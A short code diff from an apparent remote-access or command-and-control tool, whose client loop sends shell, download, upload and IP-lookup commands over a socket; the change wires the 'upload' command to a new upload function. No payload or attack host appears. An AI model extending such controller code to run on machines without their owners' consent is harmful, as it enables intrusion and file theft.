@@ -7,7 +7,7 @@ from src.ui.help import show_main_help, show_client_help
 from src.utils.net_io import recv, send
 import json
 from src.modules.shell_module import stream_shell
-from src.modules.file_transfer import download
+from src.modules.file_transfer import download, upload
 
 
 
@@ -81,8 +81,7 @@ def client_loop(client_info):
                 download(client_info['socket'], cmd)
                     
             elif cmd.strip() == "upload":
-                send(client_info['socket'], cmd)
-                print(f"{cl.green}[+] Uploading..{cl.reset}")
+                upload(client_info['socket'], cmd)
                 
             elif cmd == "getip":
                 print(f"{cl.cyan}[*] Requesting IP information...{cl.reset}")
